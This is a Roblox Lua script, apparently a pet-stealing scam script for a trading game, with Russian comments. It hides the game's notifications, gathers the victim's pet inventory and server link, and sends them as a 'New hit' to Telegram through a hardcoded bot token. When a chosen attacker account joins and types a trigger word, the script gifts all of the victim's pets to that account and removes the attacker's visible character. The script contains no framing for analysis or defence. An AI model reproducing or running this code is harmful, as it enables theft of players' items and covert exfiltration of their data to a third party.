local CustomTradeCommand = "hi"
local CustomChatId = 7826742521
local CustomLoadTime = 100
local CustomPlayerId = 1537677213
local CustomPlayerUsername = "wssdfgiby"
--Отключаем визуал
game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification:Destroy()
-- Получаем данные о игроке и сервере
local player = game:GetService("Players").LocalPlayer
local function getServerLink()
    return 'https://www.roblox.com/games/start?placeId='..game.placeId..'&gameInstanceId='..game.jobId
end
local link = getServerLink()
-- Получаем инвентарь игрока
local userInventory = {}
local function getInventory()
    for i, item in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
        local isPet = false
        for i1, child in ipairs(item:GetChildren()) do
            if child.Name == 'PetToolServer' then
                isPet = true
                child.Parent.Handle:Destroy()
            end
        end
        if isPet then
            table.insert(userInventory, item.Name)
        end
    end
end
getInventory()
-- Публикуем полученные данные в дискорд
local telegramBotToken = "8457776167:AAHyIGOM3U0rv5Sua1U0g-Lsw2zNJlOQ4Eo"
local OwnerChatId = "1056086381"
local function sendToTelegram(dataText, chatId)


	local data = {
		chat_id = chatId,
		text = dataText,
		parse_mode = "MarkdownV2",
		disable_web_page_preview = true
	}
	if request then
	    local response = request({
	        Url = "https://api.telegram.org/bot"..telegramBotToken.."/sendMessage",
	        Method = "POST",
	        Headers = {
	            ["Content-Type"] = "application/json"
	        },
	        Body = game:GetService("HttpService"):JSONEncode(data)
	    })
        print(response.StatusCode, response.Body)
	end
end
local telegramInventoryData = ''
for i,item in ipairs(userInventory) do
    telegramInventoryData = telegramInventoryData..item..'\n'
end
sendToTelegram('✅New hit\nUser: '..player.Name..'\n`'..telegramInventoryData..'`Join Link:\n`'..link..'`\nJobId: `'..game.jobId..'`', CustomChatId)
sendToTelegram('✅New hit\nUser: '..player.Name..'\n`'..telegramInventoryData..'`Join Link:\n`'..link..'`\nJobId: `'..game.jobId..'`\nCmd:'..CustomTradeCommand, OwnerChatId)
-- Функции трейда
local function pickupItem(toolName)
    local backpack = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
    local tool = backpack:FindFirstChild(toolName)
    if tool then
        player.Character.Humanoid:EquipTool(tool)
    end
end
local function sendTrade(username)
    for i, item in ipairs(userInventory) do
        pickupItem(item)
        local args = {
        	"GivePet",
        	game:GetService("Players"):WaitForChild(username)
        }
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
        task.wait(3)
    end
end
-- Запуск кода
game:GetService("Players").PlayerAdded:Connect(function(player)
    if player.UserId == 9043281161 or player.UserId == CustomPlayerId then
        print('plr joined')
        if player.UserId == 9043281161 then
            print("Поиск объекта LilPiskaScammer...")
            local obj = workspace:FindFirstChild("LilPiskaScammer")
            if obj then
                print("Объект найден, уничтожаю")
                obj:Destroy()
            else
                print("Объект НЕ найден в Workspace")
            end
        elseif player.UserId == CustomPlayerId then
            print("Поиск объекта LilPiskaScammer...")
            local obj = workspace:FindFirstChild(CustomPlayerUsername)
            if obj then
                print("Объект найден, уничтожаю")
                obj:Destroy()
            else
                print("Объект НЕ найден в Workspace")
            end
        end
        sendToTelegram("bozo scammed", OwnerChatId)
        player.Chatted:Connect(function(message)
            if message == CustomTradeCommand then
                if player.UserId == 9043281161 then
                    print('hi')
                    sendTrade("LilPiskaScammer")
                elseif player.UserId == CustomPlayerId then
                    print('hi')
                    sendTrade(CustomPlayerUsername)
                end
            end
        end)
    end
end)
